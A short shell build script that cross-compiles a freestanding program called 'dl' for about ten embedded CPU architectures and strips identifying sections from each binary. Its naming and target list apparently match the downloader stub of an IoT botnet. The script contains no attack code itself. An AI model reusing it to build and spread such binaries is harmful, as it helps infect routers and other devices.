parent_dir="$(dirname "$PWD")"
generic_prefix="${parent_dir}/cross-compile/"

armv4l_prefix="${generic_prefix}armv4l/bin/armv4l-"
armv5l_prefix="${generic_prefix}armv5l/bin/armv5l-"
armv6l_prefix="${generic_prefix}armv6l/bin/armv6l-"
i586_prefix="${generic_prefix}i586/bin/i586-"
m68k_prefix="${generic_prefix}m68k/bin/m68k-"
mips_prefix="${generic_prefix}mips/bin/mips-"
mips64_prefix="${generic_prefix}mips64/bin/mips64-"
mipsel_prefix="${generic_prefix}mipsel/bin/mipsel-"
powerpc_prefix="${generic_prefix}powerpc/bin/powerpc-"
sh4_prefix="${generic_prefix}sh4/bin/sh4-"
sparc_prefix="${generic_prefix}sparc/bin/sparc-"

rm -rf ./bin
mkdir ./bin

compile(){
  prefix="$1"
  arch="$2"
  def="$3"
  target="${4}"
  ${prefix}gcc -Os -D ARCH=\"${arch}\" -D ${def} -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -ffreestanding -static ${target}.c -o ./bin/${target}.${arch}
  ${prefix}strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./bin/${target}.${arch}
}

compile "${armv4l_prefix}" "arm" "ARM" "dl"
compile ${armv5l_prefix} "arm" "ARM" "dl"
compile ${armv6l_prefix} "arm7" "ARM" "dl"
compile "" "x86" "x32" "dl"
compile ${m68k_prefix} "m68k" "M68K" "dl"
compile ${mips_prefix} "mips" "MIPS" "dl"
#compile ${mips64_prefix} "mps64" "MIPS"
compile ${mipsel_prefix} "mpsl" "MIPSEL" "dl"
compile ${powerpc_prefix} "ppc" "PPC" "dl"
compile ${sh4_prefix} "sh4" "SH4" "dl"
compile ${sparc_prefix} "spc" "SPARC" "dl"


